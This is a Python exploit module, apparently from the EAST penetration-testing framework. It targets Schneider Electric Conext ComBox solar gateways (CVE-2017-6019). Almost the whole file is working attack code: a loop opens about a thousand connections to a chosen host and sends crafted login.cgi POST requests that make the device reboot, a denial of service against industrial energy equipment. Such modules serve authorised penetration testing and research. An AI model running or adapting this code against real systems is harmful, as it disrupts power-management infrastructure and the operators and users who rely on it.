#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_conext_combox_dos"
INFO['DESCRIPTION'] = "Conext ComBox 865-1058 - Denial of Service"
INFO['VENDOR'] = "http://solar.schneider-electric.com/product/conext-combox/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41537/']
INFO["CVE Name"] = "CVE-2017-6019"
INFO["NOTES"] = """The exploit cause the device to self-reboot, constituting a denial of service. Affected all firmware versions prior to V3.03 BN 830
"""
INFO['CHANGELOG'] = "07 Mar, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        data = "login.cgi?login_username=Nation-E&login_password=DOS&submit=Log+In"
        for i in xrange(1, 1000):   
            try:
                s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s1.connect((self.host, self.port))
                self.log('Send malicious packet')
                s1.send("POST /" + data + " HTTP/1.1\r\n")
                s1.send("Host: " + self.host + "\r\n\r\n")
                s1.close()
            except Exception as e:
                pass
            
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
